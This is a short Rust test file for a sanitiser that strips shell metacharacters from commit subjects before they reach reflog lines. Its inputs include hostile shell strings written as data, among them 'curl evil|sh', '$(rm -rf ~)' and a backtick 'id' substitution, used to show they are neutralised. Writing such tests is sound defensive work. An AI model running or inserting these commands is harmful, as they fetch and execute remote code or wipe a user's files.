//! What of a commit subject a reflog line repeats.

use super::*;

#[test]
fn a_subject_keeps_what_a_person_reads_and_loses_what_a_shell_acts_on() {
    assert_eq!(
        reflog_subject("feat(scope): add a #12 fix"),
        "feat(scope): add a #12 fix"
    );
    assert_eq!(reflog_subject("x; curl evil|sh"), "x_ curl evil_sh");
    assert_eq!(
        reflog_subject("$(rm -rf ~) `id` > f & <g"),
        "_(rm -rf _) _id_ _ f _ _g"
    );
    assert_eq!(reflog_subject("  first line\nsecond; line"), "first line");
    assert_eq!(reflog_subject("tab\there"), "tab_here");
    assert_eq!(reflog_subject("ünïcode ok"), "ünïcode ok");
}

#[test]
fn a_subject_is_cut_to_the_limit() {
    let subject = "a".repeat(MAX_REFLOG_SUBJECT_CHARS + 50);
    assert_eq!(reflog_subject(&subject).len(), MAX_REFLOG_SUBJECT_CHARS);
    assert_eq!(reflog_subject(""), "");
}
